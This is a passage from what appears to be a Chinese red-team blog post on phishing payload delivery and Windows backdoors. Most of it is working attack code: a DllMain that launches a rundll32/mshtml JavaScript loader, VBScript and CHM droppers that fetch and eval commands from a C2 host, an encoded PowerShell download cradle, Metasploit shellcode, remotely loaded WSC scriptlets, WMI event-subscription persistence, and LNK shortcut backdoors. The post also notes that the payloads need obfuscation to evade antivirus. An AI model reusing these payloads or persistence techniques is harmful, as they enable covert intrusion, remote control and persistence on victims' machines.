rel="noopener">https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py</a></p><h2 id="0x01-Notepad-dll后门"><a href="#0x01-Notepad-dll后门" class="headerlink" title="0x01 Notepad++ dll后门"></a>0x01 Notepad++ dll后门</h2><p>就是利用notepad++自带的import plugin功能，调用dll达到命令执行</p><p><img src="/Phishing Attack - 文件落地.resources/5B9031F9-6667-4535-B8DC-C1937D69D7E2.png" alt="400502f6e034cc52cd458c0c2451c407"></p><p><img src="/Phishing Attack - 文件落地.resources/567F801D-BF7D-415B-B71B-8C69B5FC2655.png" alt="3afea44ee05002f146cd03bebbf5141a"></p><p><img src="/Phishing Attack - 文件落地.resources/52DA7410-409A-48B8-A25F-D831E35E4895.png" alt="1877d5f999e0f057f910ad4e17d76273"></p><p>应用场景： 伪造插件进行钓鱼</p><h2 id="0x02-JSRAT"><a href="#0x02-JSRAT" class="headerlink" title="0x02 JSRAT"></a>0x02 JSRAT</h2><p><a href="http://www.anquan.us/static/drops/tips-11764.html" target="_blank" rel="noopener">Javascript Backdoor</a></p><p>核心思路是利用<strong>rundll32.exe</strong>执行javascript代码<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(‘foo’);</span><br></pre></td></tr></table></figure></p><p>所以，为什么可以执行呢？<br><a href="https://wooyun.js.org/drops/JavaScript%E5%90%8E%E9%97%A8%E6%B7%B1%E5%B1%82%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">JavaScript后门深层分析</a></p><p><a href="http://www.anquan.us/static/drops/tips-12386.html" target="_blank" rel="noopener">JavaScript Phishing</a></p><h3 id="利用DLL-加载-JS"><a href="#利用DLL-加载-JS" class="headerlink" title="利用DLL 加载 JS"></a>利用DLL 加载 JS</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule, </span></span></span><br><span class="line"><span class="function"><span class="params">                      DWORD  ul_reason_for_call, </span></span></span><br><span class="line"><span class="function"><span class="params">                      LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *command=<span class="string">"cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new\%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.1.100/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new\%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"</span>;           </span><br><span class="line">            WinExec(command,SW_HIDE); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回弹到192.168.1.100的<a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener">JSRat.ps1</a></p><h3 id="利用-swf-加载-JS"><a href="#利用-swf-加载-JS" class="headerlink" title="利用 swf 加载 JS"></a>利用 swf 加载 JS</h3><p>同样的，利用msf自带 windows/exec模块生成shellcode<br><img src="/Phishing Attack - 文件落地.resources/DF559A52-42EB-46F2-8F0A-93762C6A891A.png" alt="23adc6883f957f15da50e03cd6dfd4a0"></p><p>利用Adobe Flash CS6编译生成swf，配合Adobe Flash Player漏洞即可RCE</p><h3 id="利用-浏览器漏洞-加载-JS"><a href="#利用-浏览器漏洞-加载-JS" class="headerlink" title="利用 浏览器漏洞 加载 JS"></a>利用 浏览器漏洞 加载 JS</h3><p>CVE-2014-6332 等漏洞<br>利用页面执行VB Script<br><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=<span class="string">"VBScript"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> runmumaa() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">set</span> shell=createobject(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="利用-VBS-加载-JS"><a href="#利用-VBS-加载-JS" class="headerlink" title="利用 VBS 加载 JS"></a>利用 VBS 加载 JS</h3><p>利用VBS调用Wscript.shell，运行命令<br><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> shell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure></p><h3 id="利用-CHM-加载-JS"><a href="#利用-CHM-加载-JS" class="headerlink" title="利用 CHM 加载 JS"></a>利用 CHM 加载 JS</h3><p>利用CHM的后门，加载JS<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Command"</span> <span class="attr">value</span>=<span class="string">"ShortCut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Button"</span> <span class="attr">value</span>=<span class="string">"Bitmap::shortcut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item1"</span> <span class="attr">value</span>=<span class="string">',calc.exe'</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item2"</span> <span class="attr">value</span>=<span class="string">"273,1,1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">x.Click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可执行calc.exe<br>替换为对应js代码即可<br>例如：<br>远程DownloadString JSRA 回连C2<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p><h3 id="生成-Shellcode"><a href="#生成-Shellcode" class="headerlink" title="生成 Shellcode"></a>生成 Shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf5 payload(windows/messagebox) &gt; use windows/<span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line">msf5 payload(windows/<span class="built_in">exec</span>) &gt; <span class="built_in">set</span> CMD rundll32.exe javascript:\<span class="string">"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.174.136/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 payload(windows/exec) &gt; generate -f c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"> * windows/exec - 500 bytes</span></span><br><span class="line"><span class="string"> * http://www.metasploit.com</span></span><br><span class="line"><span class="string"> * VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span></span><br><span class="line"><span class="string"> * CMD=rundll32.exe javascript:"</span>\..\mshtml,RunHTMLApplication</span><br><span class="line"><span class="string">";document.write();h=new%20ActiveXObject("</span>WinHttp.WinHttpRequest.5.1<span class="string">");h.Open("</span>GET<span class="string">","</span>http://192.168.174.136/connect<span class="string">",false);try&#123;h.Send();B=h.ResponseText;eva * l(B);&#125;catch(e)&#123;new%20ActiveXObject("</span>WScript.Shell<span class="string">").Run("</span>cmd</span><br><span class="line"> * /c taskkill /f /im rundll32.exe<span class="string">",0,true);&#125;</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">unsigned char buf[] =</span></span><br><span class="line"><span class="string">"</span>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x00\x53\xff\xd5\x72\x75\x6e\x64\x6c\x6c\x33\x32\x2e\x65\x78<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x20\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x22\x5c<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2e\x2e\x5c\x6d\x73\x68\x74\x6d\x6c\x2c\x52\x75\x6e\x48\x54<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x4d\x4c\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x20\x22<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x28\x29\x3b\x68\x3d\x6e\x65\x77\x25\x32\x30\x41\x63\x74\x69<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x69\x6e\x48<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x74\x74\x70\x2e\x57\x69\x6e\x48\x74\x74\x70\x52\x65\x71\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x73\x74\x2e\x35\x2e\x31\x22\x29\x3b\x68\x2e\x4f\x70\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x47\x45\x54\x22\x2c\x22\x68\x74\x74\x70\x3a\x2f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x34\x2e\x31\x33<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x36\x2f\x63\x6f\x6e\x6e\x65\x63\x74\x22\x2c\x66\x61\x6c\x73<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x74\x72\x79\x7b\x68\x2e\x53\x65\x6e\x64\x28\x29<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x42\x3d\x68\x2e\x52\x65\x73\x70\x6f\x6e\x73\x65\x54\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x78\x74\x3b\x65\x76\x61\x6c\x28\x42\x29\x3b\x7d\x63\x61\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x63\x68\x28\x65\x29\x7b\x6e\x65\x77\x25\x32\x30\x41\x63\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x53\x63<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c\x22\x29\x2e\x52\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x63\x6d\x64\x20\x2f\x63\x20\x74\x61\x73\x6b\x6b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x6c\x6c\x20\x2f\x66\x20\x2f\x69\x6d\x20\x72\x75\x6e\x64<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6c\x6c\x33\x32\x2e\x65\x78\x65\x22\x2c\x30\x2c\x74\x72\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x7d\x00<span class="string">";</span></span><br></pre></td></tr></table></figure><h2 id="0x03-WSC"><a href="#0x03-WSC" class="headerlink" title="0x03 WSC"></a>0x03 WSC</h2><p>WSC ： Windows Script<br>WSC是微软提供快速创建COM组建的途径<br>之前lcx师傅很火的一篇文章： <a href="http://huaidan.org/archives/2574.html" target="_blank" rel="noopener">利用wsc创建asp后门</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;    </span><br><span class="line"></span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id=&quot;testCalc&quot;&gt;    </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;    </span><br><span class="line"></span><br><span class="line">&lt;/component&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure><p>JS文件只需调用wsc即可<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:C:\\testwsc\\test.wsc"</span>);</span><br></pre></td></tr></table></figure></p><p>也可进行远程调用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:https://raw.githubusercontent.com/patrilic/Backdoors/master/Wsc_backdoor/test.wsc"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="0x04-WMI-Backdoor"><a href="#0x04-WMI-Backdoor" class="headerlink" title="0x04 WMI Backdoor"></a>0x04 WMI Backdoor</h2><p><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">WMI Backdoor - wooyun Drops</a></p><h4 id="powershell-利用"><a href="#powershell-利用" class="headerlink" title="powershell 利用"></a>powershell 利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不在Client和Server留下任何文件</span><br><span class="line">不改动注册表</span><br><span class="line">仅使用powershell实现</span><br></pre></td></tr></table></figure><p><strong>利用wmi无文件存储payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure></p><h4 id="powershell-调用-javascript-backdoor"><a href="#powershell-调用-javascript-backdoor" class="headerlink" title="powershell 调用 javascript_backdoor"></a>powershell 调用 javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line"></span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line"></span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line"></span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure><h4 id="mof-调用-javascript-backdoor"><a href="#mof-调用-javascript-backdoor" class="headerlink" title="mof 调用 javascript_backdoor"></a>mof 调用 javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;)    </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP1&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consP1&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText = &quot;GetObject(\&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\&quot;)&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>类似的，也可以利用wmi执行其他后门程序，配合使用</p><p>具体的可以看这篇<br><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-8260.html</a></p><p>同时wmi也可使用 </p><blockquote><p>vbs<br>mof<br>C / C++<br>.Net<br>等方式进行执行 </p></blockquote><h2 id="0x05-Lnk-Backdoor"><a href="#0x05-Lnk-Backdoor" class="headerlink" title="0x05 Lnk Backdoor"></a>0x05 Lnk Backdoor</h2><p>可参考evi1cg师傅的文章-&gt;<a href="https://evi1cg.me/archives/Shortcut_Backdoor.html" target="_blank" rel="noopener">Shortcut_Backdoor</a><br>快捷方式会执行目标里的文件<br><img src="/Phishing Attack - 文件落地.resources/7092550A-0CF0-42AE-96C7-E41A769063B2.png" alt="e6661303d9cae03727399d7ada045593"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shortcut_gen.exe test.txt test.lnk</span><br></pre></td></tr></table></figure><p>这样点击test.lnk 就会执行test.txt中的命令</p><p>也可以使用evi1cg师傅的脚本-&gt;<a href="https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329" target="_blank" rel="noopener">https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329</a></p><h2 id="0x06-Chm-Backdoor"><a href="#0x06-Chm-Backdoor" class="headerlink" title="0x06 Chm Backdoor"></a>0x06 Chm Backdoor</h2><p>通用以上 #利用 CHM 加载 JS<br>不单可利用JS进行执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>利用Object标签，可执行各类shellcode<br>比如利用regsvr32 执行dll，利用mshta执行hta，直接运行powershell，VBS等等<br>前提当然是做好混淆和免杀</p><h2 id="0x07-CPL-Backdoor"><a href="#0x07-CPL-Backdoor" class="headerlink" title="0x07 CPL 